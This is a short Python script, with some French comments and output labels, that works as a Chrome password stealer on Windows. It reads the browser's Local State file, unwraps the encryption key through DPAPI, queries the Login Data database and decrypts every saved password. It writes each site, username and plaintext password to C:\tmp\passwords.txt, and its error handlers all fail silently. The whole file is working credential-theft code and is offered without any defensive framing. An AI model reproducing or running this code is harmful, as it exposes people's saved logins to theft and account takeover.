import json
import base64
import sqlite3
from Crypto.Cipher import AES
import win32crypt
import os

def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local",
                                        "Google", "Chrome", "User Data", "Local State")
        
        if not os.path.exists(local_state_path):
            return None

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())

        if "os_crypt" not in local_state or "encrypted_key" not in local_state["os_crypt"]:
            return None

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
        return key
    except:
        return None

def decrypt_password(ciphertext, key):
    try:
        iv = ciphertext[3:15]  # Initialisation Vector
        payload = ciphertext[15:]  # Le mot de passe cryptÃ©
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(payload)[:-16].decode()
        return decrypted_password
    except:
        return None

def main():
    key = get_encryption_key()
    if not key:
        return

    db_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google",
                           "Chrome", "User Data", "Default", "Login Data")

    if not os.path.exists(db_path):
        return

    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    except sqlite3.Error:
        return

    try:
        with open("C:\\tmp\\passwords.txt", "w", encoding="utf-8") as file:
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                decrypted_password = decrypt_password(encrypted_password, key)
                if decrypted_password:
                    file.write(f"Site: {url}\nUtilisateur: {username}\nMot de passe: {decrypted_password}\n\n")
    except:
        pass
    
    conn.close()

if __name__ == "__main__":
    main()